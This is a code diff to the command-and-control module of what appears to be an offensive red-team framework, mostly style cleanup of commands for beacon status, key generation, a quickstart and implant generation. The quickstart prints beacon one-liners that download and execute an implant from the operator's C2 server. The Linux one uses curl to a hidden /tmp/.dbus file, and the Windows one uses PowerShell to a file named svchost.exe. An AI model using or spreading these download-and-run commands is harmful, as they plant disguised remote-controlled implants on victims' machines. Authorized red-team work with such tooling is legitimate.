@@ -28,7 +28,7 @@ import time
 import cmd2
 
 from cli.commands._base import LazyOwnCommandSet
-from utils import YELLOW, GREEN, RESET, command_and_control_category, print_msg, print_succ, print_warn, print_error
+from utils import GREEN, RESET, YELLOW, command_and_control_category, print_error, print_msg, print_succ, print_warn
 
 
 class CommandAndControlCommandSet(LazyOwnCommandSet):
@@ -49,9 +49,9 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
         c2_user = self.params.get("c2_user", "?")
         c2_route = self.params.get("c2_malleable_route", "/")
 
-        print_msg(f"{'='*60}")
-        print_msg(f"  C2 STATUS")
-        print_msg(f"{'='*60}")
+        print_msg(f"{'=' * 60}")
+        print_msg("  C2 STATUS")
+        print_msg(f"{'=' * 60}")
         print_msg(f"  Endpoint    : https://{c2_host}:{c2_port}")
         print_msg(f"  Route       : {c2_route}")
         print_msg(f"  Operator    : {c2_user}")
@@ -79,7 +79,7 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
         print_msg(f"  Beacons     : {len(beacons)} ({logs} logs, {configs} configs)")
         if beacons:
             print_msg(f"  {'Client ID':<30} {'Age(s)':>8}  Status")
-            print_msg(f"  {'-'*30} {'-'*8}  {'-'*12}")
+            print_msg(f"  {'-' * 30} {'-' * 8}  {'-' * 12}")
             for client_id, age, status in sorted(beacons, key=lambda x: x[1]):
                 print_msg(f"  {client_id:<30} {age:>8}  {status}")
 
@@ -92,7 +92,7 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
             implants = [f for f in os.listdir(implant_dir) if not f.startswith(".")]
             print_msg(f"  Implants    : {len(implants)} in sessions/implant/")
 
-        print_msg(f"{'='*60}")
+        print_msg(f"{'=' * 60}")
 
     @cmd2.with_category(command_and_control_category)
     def do_c2_beacons(self, _line):
@@ -134,6 +134,7 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
     def do_c2_keygen(self, _line):
         """Generate a fresh AES-256 key for beacon encryption."""
         import os as _os
+
         sessions_dir = self.params.get("sessions_dir") or os.path.join(
             os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
             "sessions",
@@ -155,6 +156,7 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
         for both Linux and Windows targets.
         """
         import os as _os
+
         sessions_dir = self.params.get("sessions_dir") or os.path.join(
             os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
             "sessions",
@@ -174,19 +176,23 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
         route = self.params.get("c2_malleable_route", "/")
         aes_key = self.params.get("aes_key", "")
 
-        print_msg(f"\n{'='*60}")
-        print_msg(f"  C2 QUICKSTART")
-        print_msg(f"{'='*60}")
+        print_msg(f"\n{'=' * 60}")
+        print_msg("  C2 QUICKSTART")
+        print_msg(f"{'=' * 60}")
         print_msg(f"  Listener    : https://{lhost}:{c2_port}")
         print_msg(f"  Route       : {route}")
-        print_msg(f"  Implants    : sessions/implant/")
-        print_msg(f"{'='*60}")
+        print_msg("  Implants    : sessions/implant/")
+        print_msg(f"{'=' * 60}")
 
         print_msg(f"\n{GREEN}[+] Linux beacon one-liner:{RESET}")
-        print_msg(f"  curl -sk 'https://{lhost}:{c2_port}{route}lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus")
+        print_msg(
+            f"  curl -sk 'https://{lhost}:{c2_port}{route}lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus"
+        )
 
         print_msg(f"\n{GREEN}[+] Windows beacon (PowerShell):{RESET}")
-        print_msg(f"  iwr -Uri 'https://{lhost}:{c2_port}{route}win.exe' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe")
+        print_msg(
+            f"  iwr -Uri 'https://{lhost}:{c2_port}{route}win.exe' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe"
+        )
 
     @cmd2.with_category(command_and_control_category)
     def do_c2_beacon_cmd(self, line):
@@ -248,13 +254,13 @@ class CommandAndControlCommandSet(LazyOwnCommandSet):
         os.makedirs(implant_dir, exist_ok=True)
 
         if platform == "linux":
-            print_msg(f"Generating Linux Go implant...")
+            print_msg("Generating Linux Go implant...")
             print_msg(f"  Target: https://{lhost}:{c2_port}{route}")
-            print_msg(f"  For compile instructions, use: c2_builder")
+            print_msg("  For compile instructions, use: c2_builder")
         elif platform == "windows":
-            print_msg(f"Generating Windows implant...")
+            print_msg("Generating Windows implant...")
             print_msg(f"  Target: https://{lhost}:{c2_port}{route}")
-            print_msg(f"  For compile instructions, use: c2_builder")
+            print_msg("  For compile instructions, use: c2_builder")
         else:
             print_error("Platform must be 'linux' or 'windows'")
             print_msg("Usage: c2_implant <linux|windows> [output_name]")
